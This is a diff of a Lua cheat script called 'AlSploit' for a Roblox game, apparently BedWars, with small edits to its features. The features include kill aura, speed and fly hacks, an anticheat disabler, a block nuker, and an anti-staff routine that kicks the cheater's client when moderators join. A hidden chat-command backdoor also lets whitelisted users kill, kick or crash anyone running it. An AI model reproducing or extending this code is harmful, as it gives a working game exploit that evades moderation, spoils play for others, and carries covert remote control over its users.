@@ -11,7 +11,7 @@ local PlayerService = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
-local WorkSpace = game:GetService("Workspace") or workspace
+local WorkSpace = game:GetService("Workspace") or game.Workspace or workspace
 local CoreGui = game:GetService("CoreGui")
 
 local AlSploit = Instance.new("ScreenGui")
@@ -734,7 +734,6 @@ local function CreateSettingsFile()
 		BedTp = {Value = true, KeyBind = "..."},
 		Cape = {Value = true, KeyBind = "..."},
 		Fly = {Value = false, KeyBind = "..."},
-                Trail = {Value = true, KeyBind = "..."},
 		Esp = {Value = true, KeyBind = "..."},
 		Fov = {Value = false, Fov = 100, KeyBind = "..."}
 	}
@@ -1050,7 +1049,7 @@ function ShootProjectile(Item, Projectile)
 			[6] = Vector3.new(0, -25, 0),
 			[7] = HttpService:GenerateGUID(true),
 			[8] = {["drawDurationSeconds"] = 0.96, ["shotId"] = HttpService:GenerateGUID(false)},
-			[9] = (game.Workspace:GetServerTimeNow() - 0.11)
+			[9] = (WorkSpace:GetServerTimeNow() - 0.11)
 		}
 
 		ProjectileRemote:InvokeServer(unpack(Args))
@@ -1129,7 +1128,7 @@ function TouchingGround()
 		for x = 1, 1 do
 			local Origin = LocalPlayer.Character.PrimaryPart.Position + Vector3.new(x, 0, 0)
 
-			local Raycast = game.Workspace:Raycast(Origin, Vector3.new(0, -2.5, 0), Parameters)
+			local Raycast = WorkSpace:Raycast(Origin, Vector3.new(0, -2.5, 0), Parameters)
 			if Raycast and Raycast.Instance then
 				IsTouchingFloor = true			
 			end
@@ -1268,7 +1267,9 @@ end
 
 local function SwitchItem(Item)
 	if LocalPlayer.Character.HandInvItem.Value ~= Item then
-		EquipItemRemote:InvokeServer({hand = ReplicatedStorage:WaitForChild("Inventories"):WaitForChild("AlSploitRevamped"):WaitForChild(Item)})
+		local InventoryItem = ReplicatedStorage.Inventories:FindFirstChild(LocalPlayer.Name):FindFirstChild(Item)
+		
+		EquipItemRemote:InvokeServer({hand = InventoryItem})
 	end	
 end
 
@@ -1491,7 +1492,7 @@ function GetSpeed()
 		end
 
 		if AnticheatDisabled == true then
-			Speed = Speed + 15
+			Speed = Speed + 12
 		end
 
 		Speed = ((Speed + Settings.Speed.Speed) - 20)
@@ -1830,8 +1831,10 @@ local function SwordHit(Entity, Weapon)
 
 	task.spawn(function()
 		if Settings.KillAura.ToolCheck == false then
-			SwitchItem(Weapon.itemType)
-
+			task.spawn(function()
+				SwitchItem(Weapon.itemType)
+			end)
+			
 			SelfPosition = LocalPlayerHumanoidRootPart.Position + (20 > 14 and (LocalPlayerHumanoidRootPart.Position - EntityPrimaryPart.Position).Magnitude > 14.4 and (CFrame.lookAt(LocalPlayerHumanoidRootPart.Position, EntityPrimaryPart.Position).lookVector * ((LocalPlayerHumanoidRootPart.Position - EntityPrimaryPart.Position).Magnitude - 14)) or Vector3.zero)
 
 			SwordHitRemote:FireServer({
@@ -1918,12 +1921,12 @@ local function InfFly()
 
 			task.wait(0.025)
 
-			game.Workspace.Gravity = 50
+			WorkSpace.Gravity = 50
 			LocalPlayer.Character.PrimaryPart.Anchored = false
 
 			task.wait(1)
 
-			game.Workspace.Gravity = 196.2
+			WorkSpace.Gravity = 196.2
 		end
 	end	
 end
@@ -1937,7 +1940,7 @@ local function Nuker(NearestBed, NearestOre)
 		NukerRaycastParameters.FilterDescendantsInstances = {LocalPlayer.Character}
 		NukerRaycastParameters.IgnoreWater = true
 
-		local RaycastResult = game.Workspace:Raycast(NearestBed.Position + Vector3.new(0, 30, 0), Vector3.new(0, -35, 0), NukerRaycastParameters)
+		local RaycastResult = WorkSpace:Raycast(NearestBed.Position + Vector3.new(0, 30, 0), Vector3.new(0, -35, 0), NukerRaycastParameters)
 
 		if RaycastResult then
 			if RaycastResult.Instance then
@@ -2052,17 +2055,21 @@ end
 task.spawn(function()
 	repeat
 		task.wait()
+		
+		if Settings.KillAura.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
+			local NearestEntity = FindNearestEntity(Settings.KillAura.Range)
+			local Sword = GetSword()
 
-		task.spawn(function()
-			if Settings.KillAura.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
-				local NearestEntity = FindNearestEntity(Settings.KillAura.Range)
-				local Sword = GetSword()
-
-				if NearestEntity and Sword then
-					SwordHit(NearestEntity, Sword)
-				end
+			if NearestEntity and Sword then
+				SwordHit(NearestEntity, Sword)
 			end
-		end)
+		end
+	until not game	
+end)
+
+task.spawn(function()
+	repeat
+		task.wait()
 
 		task.spawn(function()
 			if Settings.AimAssist.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
@@ -2199,6 +2206,16 @@ task.spawn(function()
 				AutoBuy()
 			end			
 		end)
+		
+		task.spawn(function()
+			if Settings.Fov.Value == true then 
+				FovController:setFOV(Settings.Fov.Fov) 
+			end 
+			
+			if Settings.Fov.Value == false then 
+				FovController:setFOV(ClientHandlerStore:getState().Settings.fov) 
+			end
+		end)
 	until not game
 end)
 
@@ -2208,11 +2225,13 @@ task.spawn(function()
 
 		if Settings.AutoClicker.Value == true and IsAlive(LocalPlayer) and GetMatchState() ~= 0 then
 			task.spawn(function()
-				if BlockPlacementController.blockPlacer.clientManager then
+				if BlockPlacementController.blockPlacer.clientManager and ClientHandlerStore:getstate().Inventory.observedInventory == "block" then
 					local MouseInformation = BlockPlacementController.blockPlacer.clientManager:getBlockSelector():getMouseInfo(0)
-
-					BlockPlacementController.blockPlacer:placeBlock(MouseInformation.placementPosition)		
-				end					
+					
+					if MouseInformation then
+						BlockPlacementController.blockPlacer:placeBlock(MouseInformation.placementPosition)
+					end
+				end
 			end)
 
 			task.spawn(function()
@@ -2254,27 +2273,37 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-	local Cooldown = false
+	PlayerService.PlayerAdded:Connect(function(Player)
+		if Player:IsInGroup(5774246) and Player:GetRankInGroup(5774246) >= 2 then
 
-	repeat
-		task.wait(0.5)
+			task.spawn(function()
+				if Settings.AntiStaff.Kick == true then
+					LocalPlayer:Kick("A staff has joined your game!")
+				end
+				
+				CreateNotification(60,  "A staff has joined your game!")	
+			end)
+		end
+	end)
+	
+	task.spawn(function()
+		task.wait(5)
+		
+		for i, v in next, PlayerService:GetPlayers() do
+			if v:IsInGroup(5774246) and v:GetRankInGroup(5774246) >= 2 then
 
-		if Cooldown == false and Settings.AntiStaff.Value == true then
-			for i, v in next, PlayerService:GetPlayers() do
-				if v:IsInGroup(5774246) and v:GetRankInGroup(5774246) >= 2 then
-					
+				task.spawn(function()
 					task.spawn(function()
 						if Settings.AntiStaff.Kick == true then
 							LocalPlayer:Kick("A staff has joined your game!")
 						end
-
-						Cooldown = true
-						CreateNotification(60,  "A staff has joined your game!")	
-					end)								
-				end
+					end)
+					
+					CreateNotification(60,  "A staff has joined your game!")	
+				end)								
 			end
-		end		
-	until Cooldown == true
+		end
+	end)
 end)
 
 task.spawn(function()
@@ -2352,7 +2381,7 @@ task.spawn(function()
 
 			local SpeedCFrame = LocalPlayer.Character.Humanoid.MoveDirection * SpeedValue * Delta
 
-			local Raycast = game.Workspace:Raycast(LocalPlayer.Character.PrimaryPart.Position, SpeedCFrame, SpeedRaycastParameters)
+			local Raycast = WorkSpace:Raycast(LocalPlayer.Character.PrimaryPart.Position, SpeedCFrame, SpeedRaycastParameters)
 
 			if Raycast then
 				SpeedCFrame = (Raycast.Position - LocalPlayer.Character.PrimaryPart.Position) 
@@ -3032,7 +3061,7 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-	local AcDisabler, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "SpeedDisabler", Settings.AcDisabler.Value, function(CallBack)
+	local AcDisabler, DropDownButton, LayoutOrder, UIGradient = CreateToggle(BlatantTab, "AcDisabler", Settings.AcDisabler.Value, function(CallBack)
 		Settings.AcDisabler.Value = CallBack
 	end)
 
@@ -3743,7 +3772,7 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-	local PlayAgain, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "AutoPlayAgain", Settings.PlayAgain.Value, function(CallBack)
+	local PlayAgain, DropDownButton, LayoutOrder, UIGradient = CreateToggle(UtilityTab, "PlayAgain", Settings.PlayAgain.Value, function(CallBack)
 		Settings.PlayAgain.Value = CallBack
 	end)
 
@@ -3940,7 +3969,7 @@ task.spawn(function()
 			Value = not Value
 
 			if Value == true then
-				InstanceUI = CreateMiniToggle(UtilityTab, "Kick You", Settings.AntiStaff.Kick, LayoutOrder + 2, function(CallBack)
+				InstanceUI = CreateMiniToggle(UtilityTab, "Kick", Settings.AntiStaff.Kick, LayoutOrder + 2, function(CallBack)
 					Settings.AntiStaff.Kick = CallBack
 				end)
 			end
@@ -4096,7 +4125,7 @@ task.spawn(function()
 			Value = not Value
 
 			if Value == true then
-				InstanceUI = CreateSlider(UtilityTab, "Speed", Settings.Fov.Fov, 120, LayoutOrder + 2, function(CallBack)
+				InstanceUI = CreateSlider(UtilityTab, "Fov", Settings.Fov.Fov, 120, LayoutOrder + 2, function(CallBack)
 					Settings.Fov.Fov = CallBack
 
 					if Settings.Fov.Value == true then
@@ -4230,7 +4259,7 @@ task.spawn(function()
 end)
 
 task.spawn(function()
-	local GalaxySky, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "RedSky", Settings.GalaxySky.Value, function(CallBack)
+	local GalaxySky, DropDownButton, LayoutOrder, UIGradient = CreateToggle(WorldTab, "GalaxySky", Settings.GalaxySky.Value, function(CallBack)
 		Settings.GalaxySky.Value = CallBack
 
 		if Settings.GalaxySky.Value == true then
@@ -4238,7 +4267,7 @@ task.spawn(function()
 				LightingService.Sky.Parent = ReplicatedStorage
 
 				local Sky = Instance.new("Sky")
-				local ID = 14330582541
+				local ID = 8281961896
 
 				Sky.SkyboxBk = "http://www.roblox.com/asset/?id=" .. ID
 				Sky.SkyboxDn = "http://www.roblox.com/asset/?id=" .. ID
@@ -4305,7 +4334,7 @@ task.spawn(function()
 		local OldObj = debug.getupvalue(DamageIndicator, 10)
 
 		if Settings.Indicators.Value == true then
-			local Messages = {"AlSploit on top", "Best Client", "EZ", "Coco Script on top", "Best Config"}
+			local Messages = {"AlSploit", "Best Client", ":D", "💀"}
 
 			debug.setupvalue(DamageIndicator, 10, {
 				Create = function(self, obj, ...)
@@ -4424,7 +4453,7 @@ task.spawn(function()
 				end
 
 				AntiVoidPart.Touched:Connect(function()
-					if IsAlive(LocalPlayer) and AntiVoidPart and LocalPlayer.Character.PrimaryPart.Position.Y <= game.Workspace.AntiVoidPart.Position.Y then
+					if IsAlive(LocalPlayer) and AntiVoidPart and LocalPlayer.Character.PrimaryPart.Position.Y <= WorkSpace.AntiVoidPart.Position.Y then
 						for i = 1, 3 do
 							if IsAlive(LocalPlayer) then
 								LocalPlayer.Character.PrimaryPart.Velocity = Vector3.new(LocalPlayer.Character.PrimaryPart.Velocity.X, 100, LocalPlayer.Character.PrimaryPart.Velocity.Z)
@@ -4812,7 +4841,7 @@ task.spawn(function()
 		for i, v in next, game.Players:GetPlayers() do
 			v.Chatted:Connect(function(Message)
 				for i, v2 in pairs(WhitelistedUsers) do
-					if Message == ";kill default" and v.Name == v2.Name then
+					if Message:lower() == ";kill default" and v.Name == v2.Name and v.Name ~= LocalPlayer then
 						LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
 						LocalPlayer.Character.Humanoid.Health = 0	
 						
@@ -4822,21 +4851,21 @@ task.spawn(function()
 						LocalPlayer.Character.Humanoid.Health = 0
 					end
 
-					if Message == ";breakmap default" and v.Name == v2.Name then
+					if Message:lower() == ";breakmap default" and v.Name == v2.Name and v.Name ~= LocalPlayer  then
 						for i, v in pairs(CollectionService:GetTagged("block")) do
 							v:Destroy()
 						end
 					end
 
-					if Message == ";leave default" and v.Name == v2.Name  then
+					if Message:lower() == ";leave default" and v.Name == v2.Name and v.Name ~= LocalPlayer  then
 						game:Shutdown()
 					end
 
-					if Message == ";lagback default" and v.Name == v2.Name  then
+					if Message:lower() == ";lagback default" and v.Name == v2.Name and v.Name ~= LocalPlayer  then
 						LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(9e9, 9e9, 9e9)
 					end	
 
-					if Message == ";kick default" and v.Name == v2.Name then	
+					if Message:lower() == ";kick default" and v.Name == v2.Name and v.Name ~= LocalPlayer  then	
 						if v.Name == Owner then
 							LocalPlayer:Kick("Kicked by AlSploit Owner.")
 						end
@@ -4865,9 +4894,8 @@ task.spawn(function()
 
 	ViewModel.RightHand.RightWrist.C1 = C1 * CFrame.Angles(math.rad(0), math.rad(0), math.rad(RotationZ.Value))
 
-	CreateNotification(5, "Coco AlSploit Config has loaded!")
-        CreateNotification(7, "https://discord.com/invite/J6XkRGqTY3")
-        CreateNotification(5, "FPS Unlocked")
+	CreateNotification(12, "Coco AlSploit Config has loaded!")
+        CreateNotification(12, "Fps Unlocked")
 	setfpscap(999)
 end)
 
